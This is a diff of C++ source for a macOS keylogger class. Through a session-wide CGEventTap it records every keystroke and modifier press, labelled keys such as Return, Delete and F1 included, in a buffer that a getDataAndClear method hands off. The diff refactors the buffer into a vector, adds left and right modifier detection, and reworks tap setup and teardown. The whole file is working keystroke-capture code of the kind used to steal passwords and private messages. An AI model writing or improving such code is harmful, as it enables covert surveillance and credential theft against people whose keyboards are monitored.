@@ -1,10 +1,10 @@
 #include "KeyboardController.h"
 #ifdef __APPLE__
 
-std::string Keylogger::_buffer = "";
+std::vector<std::string> Keylogger::_buffer;
 std::mutex Keylogger::_mtx;
 
-Keylogger::Keylogger() : _isRunning(false) {}
+Keylogger::Keylogger() : _isRunning(false), _tapProxy(nullptr), _runLoopRef(nullptr) {}
 
 Keylogger::~Keylogger() {
     Stop();
@@ -12,82 +12,88 @@ Keylogger::~Keylogger() {
 
 void Keylogger::append(const std::string& str) {
     std::lock_guard<std::mutex> lock(_mtx);
-    _buffer += str;
+    _buffer.push_back(str);
 }
 
-// --- Callback xử lý sự kiện phím của macOS ---
 CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
     if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
         return event;
     }
 
-    // Lấy mã phím ảo
+    Keylogger* logger = static_cast<Keylogger*>(refcon);
     CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    if (keyCode == kVK_Return) append("[RETURN]");
-    else if (keyCode == kVK_Tab) append("[TAB]");
-    else if (keyCode == kVK_Space) append(" ");
-    else if (keyCode == kVK_Delete) append("[DELETE]");
-    else if (keyCode == kVK_ForwardDelete) append("[DEL]");
-    else if (keyCode == kVK_Escape) append("[ESC]");
-    else if (keyCode == kVK_Command || keyCode == kVK_RightCommand) append("[CMD]");
-    else if (keyCode == kVK_Shift || keyCode == kVK_RightShift) append("[SHIFT]");
-    else if (keyCode == kVK_CapsLock) append("[CAPS]");
-    else if (keyCode == kVK_Option || keyCode == kVK_RightOption) append("[OPT]");
-    else if (keyCode == kVK_Control || keyCode == kVK_RightControl) append("[CTRL]");
-    else if (keyCode == kVK_LeftArrow) append("[LEFT]");
-    else if (keyCode == kVK_RightArrow) append("[RIGHT]");
-    else if (keyCode == kVK_UpArrow) append("[UP]");
-    else if (keyCode == kVK_DownArrow) append("[DOWN]");
-    else if (keyCode == kVK_Home) append("[HOME]");
-    else if (keyCode == kVK_End) append("[END]");
-    else if (keyCode == kVK_PageUp) append("[PGUP]");
-    else if (keyCode == kVK_PageDown) append("[PGDN]");
-    else if (keyCode == kVK_Help) append("[INS]");
-    else if (keyCode == kVK_F1) append("[F1]");
-    else if (keyCode == kVK_F2) append("[F2]");
-    else if (keyCode == kVK_F3) append("[F3]");
-    else if (keyCode == kVK_F4) append("[F4]");
-    else if (keyCode == kVK_F5) append("[F5]");
-    else if (keyCode == kVK_F6) append("[F6]");
-    else if (keyCode == kVK_F7) append("[F7]");
-    else if (keyCode == kVK_F8) append("[F8]");
-    else if (keyCode == kVK_F9) append("[F9]");
-    else if (keyCode == kVK_F10) append("[F10]");
-    else if (keyCode == kVK_F11) append("[F11]");
-    else if (keyCode == kVK_F12) append("[F12]");
-    else if (keyCode == kVK_F13) append("[F13]");
-    else if (keyCode == kVK_F14) append("[F14]");
-    else if (keyCode == kVK_F15) append("[F15]");
-    else if (keyCode == kVK_ANSI_KeypadClear) append("[NUMLOCK]");
-    else {
-        UniChar unicodeString[4];
-        UniCharCount actualStringLength = 0;
-        
-        CGEventKeyboardGetUnicodeString(event, 4, &actualStringLength, unicodeString);
-        
-        if (actualStringLength > 0) {
-            std::string s;
-            for (int i = 0; i < actualStringLength; ++i) {
-                UniChar uc = unicodeString[i];
-                if (uc < 0x80) {
-                    s += (char)uc;
-                } else if (uc < 0x800) {
-                    s += (char)(0xC0 | (uc >> 6));
-                    s += (char)(0x80 | (uc & 0x3F));
-                } else {
-                    s += (char)(0xE0 | (uc >> 12));
-                    s += (char)(0x80 | ((uc >> 6) & 0x3F));
-                    s += (char)(0x80 | (uc & 0x3F));
-                }
-            }
-            if (!s.empty()) {
-                append(s);
+    CGEventFlags flags = CGEventGetFlags(event);
+
+    // bool isShift = (flags & kCGEventFlagMaskShift);
+    // bool isCaps = (flags & kCGEventFlagMaskAlphaShift);
+
+    if (type == kCGEventFlagsChanged) {
+        if (keyCode == kVK_CapsLock) {
+            logger->append("[CAPS]");
+            return event;
+        }
+        static std::map<CGKeyCode, std::string> modMap = {
+            {kVK_Shift, "[L-SHIFT]"}, {60, "[R-SHIFT]"},
+            {kVK_Command, "[L-CMD]"}, {54, "[R-CMD]"},
+            {kVK_Option, "[L-ALT]"},  {kVK_RightOption, "[R-ALT]"},
+            {kVK_Control, "[L-CTRL]"},{62, "[R-CTRL]"},
+            {kVK_CapsLock, "[CAPS]"},
+            {63, "[FN]"}
+        };
+
+        if (modMap.count(keyCode)) {
+            bool isDown = false;
+            if (keyCode == kVK_Shift || keyCode == 60) isDown = (flags & kCGEventFlagMaskShift);
+            else if (keyCode == kVK_Command || keyCode == 54) isDown = (flags & kCGEventFlagMaskCommand);
+            else if (keyCode == kVK_Option || keyCode == kVK_RightOption) isDown = (flags & kCGEventFlagMaskAlternate);
+            else if (keyCode == kVK_Control || keyCode == 62) isDown = (flags & kCGEventFlagMaskControl);
+            else if (keyCode == kVK_CapsLock) isDown = (flags & kCGEventFlagMaskAlphaShift);
+            else if (keyCode == 63) isDown = (flags & kCGEventFlagMaskSecondaryFn);
+            
+            if (isDown) {
+                logger->_currentModCode = keyCode;
+                logger->_modUsedAsCombo = false;
             } else {
-                append("[" + std::to_string(keyCode) + "]");
+                if (logger->_currentModCode == keyCode && !logger->_modUsedAsCombo) {
+                    logger->append(modMap[keyCode]);
+                }
+                logger->_currentModCode = 0;
             }
-        } else {
-            append("[" + std::to_string(keyCode) + "]");
+        }
+        return event;
+    }
+
+    if (type == kCGEventKeyDown) {
+        switch (keyCode) {
+            case kVK_Return:       logger->append("[RETURN]"); return event;
+            case kVK_Delete:       logger->append("[DELETE]"); return event;
+            case kVK_Space:        logger->append(" "); return event;
+            case kVK_Tab:          logger->append("[TAB]"); return event;
+            case kVK_Escape:       logger->append("[ESC]"); return event;
+            case kVK_UpArrow:      logger->append("[UP]"); return event;
+            case kVK_DownArrow:    logger->append("[DOWN]"); return event;
+            case kVK_LeftArrow:    logger->append("[LEFT]"); return event;
+            case kVK_RightArrow:   logger->append("[RIGHT]"); return event;
+
+            case kVK_F1: logger->append("[F1]"); return event; case kVK_F2: logger->append("[F2]"); return event;
+            case kVK_F3: logger->append("[F3]"); return event; case kVK_F4: logger->append("[F4]"); return event;
+            case kVK_F5: logger->append("[F5]"); return event; case kVK_F6: logger->append("[F6]"); return event;
+            case kVK_F7: logger->append("[F7]"); return event; case kVK_F8: logger->append("[F8]"); return event;
+            case kVK_F9: logger->append("[F9]"); return event; case kVK_F10: logger->append("[F10]"); return event;
+            case kVK_F11: logger->append("[F11]"); return event; case kVK_F12: logger->append("[F12]"); return event;
+        }
+        
+        UniChar characters[8];
+        UniCharCount actualLength;
+        CGEventKeyboardGetUnicodeString(event, 8, &actualLength, characters);
+
+        if (actualLength > 0) {
+            std::string result = "";
+            for (UniCharCount i = 0; i < actualLength; i++) {
+                result += (char)characters[i];
+            }
+            logger->append(result);
         }
     }
 
@@ -95,40 +101,22 @@ CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, C
 }
 
 void Keylogger::MacLoop() {
-    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
+    CGEventMask eventMask = (1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged);
+    _tapProxy = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, eventMask, CGEventCallback, this);
     
-    eventTap = CGEventTapCreate(
-        kCGSessionEventTap, 
-        kCGHeadInsertEventTap, 
-        kCGEventTapOptionDefault, 
-        eventMask, 
-        CGEventCallback, 
-        nullptr
-    );
-
-    if (!eventTap) {
-        fprintf(stderr, "[Keylogger] Failed to create event tap. Check Accessibility Permissions!\n");
-        fprintf(stderr, "[Keylogger] Go to System Preferences > Security & Privacy > Accessibility\n");
+    if (!_tapProxy) {
+        std::cerr << "[KEY_MAC] Failed to create event tap. Check Accessibility permissions!\n";
         _isRunning = false;
-        return;
     }
 
-    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
-    if (!runLoopSource) {
-        fprintf(stderr, "[Keylogger] Failed to create run loop source\n");
-        CFRelease(eventTap);
-        eventTap = nullptr;
-        _isRunning = false;
-        return;
-    }
-    
+    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, _tapProxy, 0);
+    _runLoopRef = CFRunLoopGetCurrent();
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
-    
-    CGEventTapEnable(eventTap, true);
+    CGEventTapEnable(_tapProxy, true);
+    std::cout << "[KEY_MAC] Keylogger is running...\n";
     CFRunLoopRun();
-    if (runLoopSource) {
-        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
-    }
+    CFRelease(runLoopSource);
+    CFRelease(_tapProxy);
 }
 
 void Keylogger::Start() {
@@ -144,30 +132,22 @@ void Keylogger::Stop() {
     if (!_isRunning) return;
     _isRunning = false;
 
-    if (eventTap) {
-        CGEventTapEnable(eventTap, false);
-        CFMachPortInvalidate(eventTap);
-        CFRelease(eventTap);
-        eventTap = nullptr;
+    if (_runLoopRef) {
+        CFRunLoopStop(_runLoopRef);
+        _runLoopRef = nullptr;
     }
 
-    if (runLoopSource) {
-        CFRunLoopSourceInvalidate(runLoopSource);
-        CFRelease(runLoopSource);
-        runLoopSource = nullptr;
-    }
-    
     if (_workerThread.joinable()) {
         _workerThread.join();
     }
 }
 
-std::string Keylogger::getDataAndClear() {
+std::vector<std::string> Keylogger::getDataAndClear() {
     std::lock_guard<std::mutex> lock(_mtx);
-    if (_buffer.empty()) return "";
-    std::string dataCopy = _buffer;
+    if (_buffer.empty()) return {};
+    std::vector<std::string> copy = std::move(_buffer);
     _buffer.clear();
-    return dataCopy;
+    return copy;
 }
 
 #endif
